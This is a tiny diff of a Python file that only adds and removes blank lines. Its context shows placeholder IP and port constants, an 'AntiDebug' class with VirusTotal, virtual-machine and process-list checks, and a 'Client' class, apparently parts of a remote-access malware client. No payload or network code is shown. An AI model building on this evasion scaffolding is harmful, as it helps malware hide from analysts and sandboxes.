@@ -40,6 +40,7 @@ from ctypes import *
 IP   = "IP_HERE"
 PORT = int("PORT_HERE")
 
+
 class AntiDebug():
 
     def __init__(self):
@@ -314,7 +315,6 @@ class AntiDebug():
         if self.vtdetect_switch:     self.vtdetect()      # VTDETECT
         if self.vmcheck_switch:      self.vmcheck()       # VMCHECK
         if self.listcheck_switch:    self.listcheck()     # LISTCHECK
-
 
 class Client():
     #region Client Functions
